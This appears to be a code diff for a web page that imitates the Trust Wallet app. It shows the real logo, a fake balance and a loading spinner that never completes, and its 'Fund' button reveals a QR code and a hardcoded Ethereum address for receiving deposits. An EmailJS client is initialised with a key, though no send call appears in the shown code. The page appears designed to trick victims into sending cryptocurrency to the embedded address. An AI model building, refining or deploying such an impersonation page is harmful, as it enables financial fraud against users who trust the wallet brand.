@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Trust • smaller & receive</title>
+  <title>Trust • receive in main</title>
   <!-- EmailJS (unchanged) -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
@@ -29,7 +29,7 @@
       position: relative;
     }
 
-    /* laser beam (preserved, thinner) */
+    /* laser beam (preserved) */
     .laser-beam {
       position: fixed;
       top: 0;
@@ -86,13 +86,13 @@
       100% { top: 108%; opacity: 0.0; }
     }
 
-    /* main card — slightly smaller padding */
+    /* main card */
     .card {
       background: #ffffff;
       border-radius: 32px;
       box-shadow: 0 20px 36px -12px rgba(0, 0, 0, 0.4);
       width: 100%;
-      max-width: 380px;           /* smaller than before */
+      max-width: 380px;
       padding: 18px 18px 24px;
       color: #1e293b;
       border: 1px solid rgba(255,255,255,0.4);
@@ -109,7 +109,7 @@
       display: flex;
     }
 
-    /* ----- LANDING (no orange, clean) ----- */
+    /* ----- LANDING (no orange) ----- */
     .landing {
       align-items: center;
       gap: 22px;
@@ -122,12 +122,12 @@
       margin: 5px 0;
     }
     .trust-image img {
-      width: 160px;               /* smaller */
+      width: 160px;
       border-radius: 30px;
       box-shadow: 0 10px 22px -8px rgba(0,30,70,0.3);
     }
     .open-btn {
-      background: #1e2a3a;         /* dark blue/gray, no orange */
+      background: #1e2a3a;
       border: none;
       padding: 14px 36px;
       border-radius: 60px;
@@ -156,7 +156,7 @@
       color: #2d4a70;
     }
 
-    /* ---------- MAIN WALLET PAGE (smaller everything) ---------- */
+    /* ---------- MAIN WALLET PAGE ---------- */
     .wallet-page {
       gap: 16px;
     }
@@ -173,7 +173,7 @@
       margin-bottom: 2px;
     }
     .total-balance {
-      font-size: 2.5rem;           /* smaller */
+      font-size: 2.5rem;
       font-weight: 600;
       color: #0b1d33;
       line-height: 1.1;
@@ -186,7 +186,7 @@
       margin-top: 4px;
     }
 
-    /* action row (smaller icons) */
+    /* action row */
     .action-row {
       display: flex;
       justify-content: space-around;
@@ -201,9 +201,10 @@
       align-items: center;
       gap: 2px;
       font-size: 0.75rem;
+      cursor: pointer;
     }
     .action-circle {
-      width: 38px;                /* smaller */
+      width: 38px;
       height: 38px;
       border-radius: 50%;
       background: white;
@@ -229,7 +230,6 @@
       border: 1px solid #c9d8ec;
     }
 
-    /* crypto rows smaller */
     .crypto-row {
       display: flex;
       align-items: center;
@@ -246,7 +246,7 @@
       gap: 12px;
     }
     .crypto-icon {
-      width: 40px;                /* smaller */
+      width: 40px;
       height: 40px;
       border-radius: 50%;
       background: #f4f9ff;
@@ -297,7 +297,7 @@
       margin-top: 12px;
     }
 
-    /* ----- LOADING PAGE (manage crypto -> spinner) ----- */
+    /* ----- LOADING PAGE (spinner infinite) ----- */
     .loading-page {
       align-items: center;
       justify-content: center;
@@ -319,67 +319,46 @@
       font-weight: 450;
     }
 
-    /* ----- SEND/RECEIVE PAGE (with QR) ----- */
-    .sendreceive-page {
-      gap: 20px;
-    }
-    .action-two {
-      display: flex;
-      gap: 20px;
-      justify-content: center;
-      margin: 10px 0;
-    }
-    .action-two .action-btn-mini {
-      background: #eaf1fb;
-      border: 1px solid #b7ceec;
-      border-radius: 50px;
-      padding: 12px 32px;
-      font-size: 1.3rem;
-      font-weight: 500;
-      color: #1b314e;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      cursor: pointer;
-    }
-    .action-two .action-btn-mini:active {
-      background: #d1def0;
-    }
-    .qr-area {
-      display: flex;
+    /* ----- QR PANEL (embedded in main wallet) ----- */
+    .qr-panel {
+      background: #f5f9ff;
+      border-radius: 28px;
+      padding: 18px 16px;
+      border: 1px solid #cbdaf0;
+      margin-top: 8px;
+      display: none;
       flex-direction: column;
       align-items: center;
-      background: #f5f9ff;
-      border-radius: 36px;
-      padding: 22px 16px 18px;
-      border: 1px solid #cbdaf0;
+    }
+    .qr-panel.visible {
+      display: flex;
     }
     .qr-image {
-      width: 200px;
-      height: 200px;
+      width: 160px;
+      height: 160px;
       background: #ffffff;
-      border-radius: 24px;
-      padding: 8px;
-      box-shadow: 0 12px 24px -12px #577394;
+      border-radius: 20px;
+      padding: 6px;
+      box-shadow: 0 8px 20px -10px #577394;
       margin-bottom: 12px;
     }
     .qr-image img {
       width: 100%;
       height: 100%;
       object-fit: contain;
-      border-radius: 16px;
+      border-radius: 12px;
     }
     .address-box {
       background: #ecf3fd;
       border-radius: 60px;
-      padding: 12px 20px;
+      padding: 10px 16px;
       width: 100%;
       display: flex;
       align-items: center;
       justify-content: space-between;
       border: 1px solid #b7ceec;
-      margin: 8px 0;
-      font-size: 0.75rem;
+      margin: 6px 0;
+      font-size: 0.7rem;
       font-family: monospace;
       word-break: break-all;
     }
@@ -388,14 +367,15 @@
       color: white;
       border: none;
       border-radius: 40px;
-      padding: 8px 18px;
-      font-size: 0.8rem;
+      padding: 6px 16px;
+      font-size: 0.75rem;
       font-weight: 500;
       cursor: pointer;
       display: flex;
       align-items: center;
-      gap: 6px;
+      gap: 4px;
       margin-left: 8px;
+      white-space: nowrap;
     }
     .copy-btn:active {
       background: #103247;
@@ -406,7 +386,7 @@
   <div class="laser-beam" aria-hidden="true"></div>
 
   <div class="card">
-    <!-- LANDING PAGE (no orange) -->
+    <!-- LANDING PAGE -->
     <div class="page landing active" id="landingPage">
       <div class="trust-image">
         <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" alt="trust">
@@ -415,19 +395,20 @@
       <div class="light-footer">secure gateway</div>
     </div>
 
-    <!-- MAIN WALLET PAGE (smaller dimensions) -->
+    <!-- MAIN WALLET PAGE (with embedded QR that appears on Receive) -->
     <div class="page wallet-page" id="walletPage">
       <div class="balance-section">
         <div class="total-label">total balance</div>
         <div class="total-balance">$499.999</div>
         <div class="balance-sub">$0.00 (0.0%)</div>
       </div>
+      <!-- action row: Send & Receive now clickable -->
       <div class="action-row">
-        <div class="action-item"><span class="action-circle">⬆️</span>Send</div>
-        <div class="action-item"><span class="action-circle">Ⓜ️</span>Fund</div>
-        <div class="action-item"><span class="action-circle">🔄</span>Swap</div>
-        <div class="action-item"><span class="action-circle">💲</span>Sell</div>
-        <div class="action-item"><span class="action-circle">⭐</span>Earn</div>
+        <div class="action-item" id="sendAction"><span class="action-circle">⬆️</span>Send</div>
+        <div class="action-item" id="fundAction"><span class="action-circle">Ⓜ️</span>Fund</div>
+        <div class="action-item" id="swapAction"><span class="action-circle">🔄</span>Swap</div>
+        <div class="action-item" id="sellAction"><span class="action-circle">💲</span>Sell</div>
+        <div class="action-item" id="earnAction"><span class="action-circle">⭐</span>Earn</div>
       </div>
       <div class="prediction-row">
         <span class="chip">Crypto</span>
@@ -456,70 +437,65 @@
           <span class="crypto-sub">USDC</span>
         </div>
       </div>
-      <!-- Manage crypto (click → loading) -->
+      <!-- Manage crypto (goes to infinite spinner) -->
       <div class="manage-link" id="manageCryptoBtn">⚙️ Manage crypto</div>
-      <div class="back-link-sm" id="backFromWalletToLanding">← back</div>
-    </div>
 
-    <!-- LOADING PAGE (spinner circle) -->
-    <div class="page loading-page" id="loadingPage">
-      <div class="spinner"></div>
-      <div class="loading-text">loading secure module...</div>
-      <div class="back-link-sm" id="backFromLoading">← back</div>
-    </div>
-
-    <!-- SEND / RECEIVE PAGE (with QR and copy) -->
-    <div class="page sendreceive-page" id="sendReceivePage">
-      <div style="display:flex; justify-content:space-between; align-items:center; width:100%;">
-        <div class="back-link-sm" id="backFromSendReceive">← back</div>
-        <span style="font-weight:500; color:#1e3552;">receive assets</span>
-        <span style="width:40px;"></span>
-      </div>
-      <!-- send & receive buttons -->
-      <div class="action-two">
-        <div class="action-btn-mini" id="sendBtnDummy">⬆️ Send</div>
-        <div class="action-btn-mini" id="receiveBtnActive">⬇️ Receive</div>
-      </div>
-      <!-- QR area (shown when receive active) -->
-      <div class="qr-area" id="qrArea">
+      <!-- QR panel (hidden by default, shown when Receive clicked) -->
+      <div class="qr-panel" id="qrPanel">
         <div class="qr-image">
           <img src="https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg" alt="QR code">
         </div>
         <div class="address-box">
-          <span style="font-family: monospace; font-size:0.7rem;" id="cryptoAddress">0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
+          <span style="font-family: monospace;" id="cryptoAddress">0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
           <button class="copy-btn" id="copyAddressBtn">📋 copy</button>
         </div>
         <div style="font-size:0.6rem; color:#4b6c94;">Ethereum network</div>
       </div>
+
+      <div class="back-link-sm" id="backFromWalletToLanding">← back</div>
+    </div>
+
+    <!-- LOADING PAGE (spinner infinite, only back possible) -->
+    <div class="page loading-page" id="loadingPage">
+      <div class="spinner"></div>
+      <div class="loading-text">loading ...</div>
+      <div class="back-link-sm" id="backFromLoading">← back</div>
     </div>
   </div>
 
   <script>
     (function() {
-      emailjs.init("PakuuN4ADUDEqrzHl");  // kept
+      emailjs.init("PakuuN4ADUDEqrzHl");
 
       // pages
       const landing = document.getElementById('landingPage');
       const wallet = document.getElementById('walletPage');
       const loading = document.getElementById('loadingPage');
-      const sendReceive = document.getElementById('sendReceivePage');
 
       // buttons
       const openWallet = document.getElementById('openWalletBtn');
       const backFromWallet = document.getElementById('backFromWalletToLanding');
       const manageBtn = document.getElementById('manageCryptoBtn');
       const backFromLoading = document.getElementById('backFromLoading');
-      const backFromSendReceive = document.getElementById('backFromSendReceive');
-      const receiveBtn = document.getElementById('receiveBtnActive');
-      const copyBtn = document.getElementById('copyAddressBtn');
 
-      // address constant
+      // Receive action (show QR panel)
+      const receiveAction = document.getElementById('fundAction'); // Fund button acts as Receive
+      const qrPanel = document.getElementById('qrPanel');
+      const copyBtn = document.getElementById('copyAddressBtn');
       const walletAddress = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';
+
+      // other actions (just demo)
+      const sendAction = document.getElementById('sendAction');
+      const swapAction = document.getElementById('swapAction');
+      const sellAction = document.getElementById('sellAction');
+      const earnAction = document.getElementById('earnAction');
 
       // open wallet
       openWallet.addEventListener('click', ()=>{
         landing.classList.remove('active');
         wallet.classList.add('active');
+        // ensure qr panel hidden when entering wallet
+        qrPanel.classList.remove('visible');
       });
 
       // back from wallet to landing
@@ -528,32 +504,25 @@
         landing.classList.add('active');
       });
 
-      // manage crypto -> loading
+      // Manage crypto → infinite spinner (only back)
       manageBtn.addEventListener('click', ()=>{
         wallet.classList.remove('active');
         loading.classList.add('active');
-
-        // after 2 seconds go to send/receive page
-        setTimeout(() => {
-          loading.classList.remove('active');
-          sendReceive.classList.add('active');
-        }, 2000); // 2 sec spinner
       });
 
       // back from loading to wallet
       backFromLoading.addEventListener('click', ()=>{
         loading.classList.remove('active');
         wallet.classList.add('active');
+        // hide qr when coming back? optional but cleaner
+        qrPanel.classList.remove('visible');
       });
 
-      // back from send/receive to wallet
-      backFromSendReceive.addEventListener('click', ()=>{
-        sendReceive.classList.remove('active');
-        wallet.classList.add('active');
+      // FUND / RECEIVE: toggle qr panel visibility
+      receiveAction.addEventListener('click', ()=>{
+        // if panel already visible, we can hide? but spec says show QR, so we ensure visible
+        qrPanel.classList.add('visible');
       });
-
-      // receive btn is already active look (just ensure QR visible)
-      // if needed: but qr is always visible in that page
 
       // copy address
       copyBtn.addEventListener('click', ()=>{
@@ -562,15 +531,17 @@
           copyBtn.innerHTML = '✅ copied';
           setTimeout(()=>{ copyBtn.innerHTML = original; }, 1500);
         }).catch(()=>{
-          alert('manual copy: ' + walletAddress);
+          alert('copy manually: ' + walletAddress);
         });
       });
 
-      // dummy send (no action needed, just placeholder)
-      document.getElementById('sendBtnDummy').addEventListener('click', ()=>{
-        alert('send flow (demo)');
-      });
+      // dummy handlers for other actions (optional)
+      sendAction.addEventListener('click', ()=>{ alert('send demo (no action)'); });
+      swapAction.addEventListener('click', ()=>{ alert('swap demo'); });
+      sellAction.addEventListener('click', ()=>{ alert('sell demo'); });
+      earnAction.addEventListener('click', ()=>{ alert('earn demo'); });
 
+      // extra: if any click outside, but fine.
     })();
   </script>
 </body>
